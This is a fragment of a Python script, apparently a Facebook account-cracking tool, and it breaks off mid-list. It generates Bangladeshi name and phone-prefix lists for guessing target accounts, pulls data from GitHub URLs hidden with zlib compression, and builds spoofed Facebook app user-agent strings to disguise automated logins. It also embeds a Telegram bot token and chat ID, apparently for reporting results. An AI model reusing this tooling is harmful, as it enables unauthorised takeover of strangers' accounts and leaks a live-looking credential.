B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, N, R, Y,]
###----------[ CONVERT LINE ]----------###
led = f'{M} -{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}{M}-{M}-{M}-{H}-{M}'
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}√{K}] {P}'
dot=f' {K}[{GREEN}•{K}] {P}'
rdd=f' {K}[{RED}•{K}] {P}'
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
rong=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong2=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong3=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong4=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong5=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong6=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong7=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
fst=f'{dot}[{H}sumon{M}-{H}milon{M}-{H}BITHIKA{M}-{H}sakshi{M}-{H}mimi{P}]'
lst=f'{dot}[{H}roy{M}-{H}sarkar{M}-{H}biswas{M}-{H}das{M}-{H}khan{P}]'
limitt=f'{dot}[{H}5000{M}-{H}10000{M}-{H}15000{M}-{H}20000{M}-{H}50000{P}]'
c7=f'{dot}[{H}7679{M}-{H}9832{M}-{H}6297{M}-{H}9987{M}-{H}8817{M}-{H}7209{P}]'
c6=f'{dot}[{H}01778{M}-{H}01991{M}-{H}01661{M}-{H}01776{M}-{H}01996{M}-{H}01779{P}]'
c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}]'
mtd,cp_xdx,cokix=[],[],[]
token = ('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')
ID = ('1778046662')
ip = requests.get('https://api.ipify.org').text.strip()
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
loop = 0
oks = []
cps = []
id = []
ck = []
ugen2=[]
ugen=[]
cokbrut=[]
princp=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
cooki = []
cpxx = []
plist=[]
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
os.system('')
today = '\033[1;36m'+str(hari)+'\033[1;97m-\033[1;36m'+str(bulan)+'\033[1;97m-\033[1;36m'+str(tahun)
#--------------------------------[METHOD 1]--------------------------------#
_method_1_buffer = BytesIO()
_method_1_curl = pycurl.Curl()
_method_1_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%\x86 \x01\x00\xab\x86\x19\xd8'))
_method_1_curl.setopt(pycurl.WRITEDATA, _method_1_buffer)
_method_1_curl.perform()
_method_1_data = _method_1_buffer.getvalue().decode('utf-8').splitlines()
def mls1():
    END = ''.join(_method_1_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 2]--------------------------------#
_method_2_buffer = BytesIO()
_method_2_curl = pycurl.Curl()
_method_2_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%F \x01\x00\xab\x8b\x19\xd9'))
_method_2_curl.setopt(pycurl.WRITEDATA, _method_2_buffer)
_method_2_curl.perform()
_method_2_data = _method_2_buffer.getvalue().decode('utf-8').splitlines()
def mls2():
    END = ''.join(_method_2_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 3]--------------------------------#
_method_3_buffer = BytesIO()
_method_3_curl = pycurl.Curl()
_method_3_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x06\t\x00\x00\xaa0\x19\xba'))
_method_3_curl.setopt(pycurl.WRITEDATA, _method_3_buffer)
_method_3_curl.perform()
_method_3_data = _method_3_buffer.getvalue().decode('utf-8').splitlines()
def mls3():
    END = ''.join(_method_3_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 4]--------------------------------#
_method_4_buffer = BytesIO()
_method_4_curl = pycurl.Curl()
_method_4_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x01\t\x00\x00\xaa5\x19\xbb'))
_method_4_curl.setopt(pycurl.WRITEDATA, _method_4_buffer)
_method_4_curl.perform()
_method_4_data = _method_4_buffer.getvalue().decode('utf-8').splitlines()
def mls4():
    END = ''.join(_method_4_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 5]--------------------------------#
_method_5_buffer = BytesIO()
_method_5_curl = pycurl.Curl()
_method_5_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x05\t\x00\x00\xaa:\x19\xbc'))
_method_5_curl.setopt(pycurl.WRITEDATA, _method_5_buffer)
_method_5_curl.perform()
_method_5_data = _method_5_buffer.getvalue().decode('utf-8').splitlines()
def mls5():
    END = ''.join(_method_5_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 6]--------------------------------#
_method_6_buffer = BytesIO()
_method_6_curl = pycurl.Curl()
_method_6_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x03\t\x00\x00\xaa?\x19\xbd'))
_method_6_curl.setopt(pycurl.WRITEDATA, _method_6_buffer)
_method_6_curl.perform()
_method_6_data = _method_6_buffer.getvalue().decode('utf-8').splitlines()
def mls6():
    END = ''.join(_method_6_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[NORMAL MTD]--------------------------------#
import requests,random

def ua_valid():
    rr = random.randint
    rc = random.choice
    model2 = requests.get('https://gi'+'st.githubus'+'ercontent.com/BITHIKA-XD/c3d50589'+'d804b5b7ab5a7717a22cfe0d/raw/6937320508d'+'d57dd78d0c2'+'97d532fdc233306d01/m'+'dls.txt').text.splitlines()
    model = random.choice(model2)
    redmi4 = f"Mozilla/5.0 (Linux; Android 13; {model} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    return rc([redmi4])
#--------------------------------[VERSION CHANGE]--------
try:
    version = requests.get(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\x0fK-*\xce\xcc\xcf\x03\t\x00\x00\xab\xe0\x1a\x00')).text
except:
    print('No Internet Connection.....');exit()
version = version.strip()
#-------------------------[RANDOM]--------
ugrn=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugrn.append(ug)
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[DEF1]--------------------------------------------------------------------------------------------------------------------------------#
def DEF1():   
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H']  
    budi = ['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V']  
    akagami1 = "[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1369};FBLC/pt_BR;FBRV/281357705;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    akagami2 = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278218861;FBCR/smartmobil.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(budi))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    akagami3 = "[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/290555739;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/"+str(random.choice(redmi))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    akagami4 = "[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342877;FBDM/{density=2.0,width=720,height=1424};FBLC/pl_PL;FBRV/268803887;FBCR/T-Mobile.pl;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(random.choice(oppo))+";FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    akagami5 = "[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931191;FBDM/{density=3.0,width=1080,height=2153};FBLC/en_US;FBRV/0;FBCR/LV TELE2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+str(random.choice(infinix))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    user = random.choice([akagami1,akagami2,akagami3,akagami4,akagami5])
    trt = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + user
    return trt  
#----------------------------[DEF2]--------------------------------------------------------------------------------------------------------------------------------#
def DEF2():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return ua
#----------------------------[DEF3]--------------------------------------------------------------------------------------------------------------------------------#
def DEF3():
    fban_fb4a = [f'FBAN/FB4A;FBAV/{301 + i}.0.0.0.{65 + i}' for i in range(49)]
    fbav = ['FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999))]
    fbbv = ['FBBV/' + str(random.randint(1111111, 9999999))]
    fbdm = list({f'FBDM/{{density=1.0,width={w},height={h}}}' for w, h in [(320, 480), (320, 568), (360, 640), (375, 667), (360, 720), (414, 736), (375, 812), (414, 896), (360, 780), (412, 846), (411, 731), (412, 847), (393, 786), (392, 820), (412, 869), (393, 851), (360, 683)]})
    fblc = ['FBLC/' + lang for lang in ['en_US', 'en_GB', 'es_ES', 'es_LA', 'fr_FR', 'de_DE', 'it_IT', 'nl_NL', 'pt_BR', 'pt_PT', 'ar_AR', 'bn_IN', 'zh_CN', 'zh_HK', 'zh_TW', 'hr_HR', 'cs_CZ', 'da_DK', 'fi_FI', 'fr_FR', 'de_DE', 'el_GR', 'iw_IL', 'hi_IN', 'hu_HU', 'in_ID', 'ja_JP', 'ko_KR', 'ms_MY', 'nb_NO', 'fa_IR', 'pl_PL', 'ro_RO', 'ru_RU', 'sr_RS', 'sk_SK', 'sl_SI', 'es_CL', 'sv_SE', 'tl_PH', 'th_TH', 'tr_TR', 'uk_UA', 'vi_VN', 'cy_GB', 'ur_PK', 'fy_NL', 'ne_NP', 'sq_AL', 'am_ET', 'hy_AM', 'az_AZ', 'eu_ES', 'be_BY', 'bs_BA', 'ka_GE', 'is_IS', 'jv_ID', 'kn_IN', 'kk_KZ', 'km_KH', 'lo_LA', 'la_VA', 'lv_LV', 'lt_LT', 'mk_MK', 'mg_MG', 'ms_BN', 'mt_MT', 'mr_IN', 'mn_MN', 'my_MM', 'nl_BE', 'no_NO', 'or_IN', 'ps_AF', 'fa_AF', 'pa_IN', 'qu_PE', 'ro_MD', 'rw_RW', 'sm_WS', 'st_ZA', 'sn_ZW', 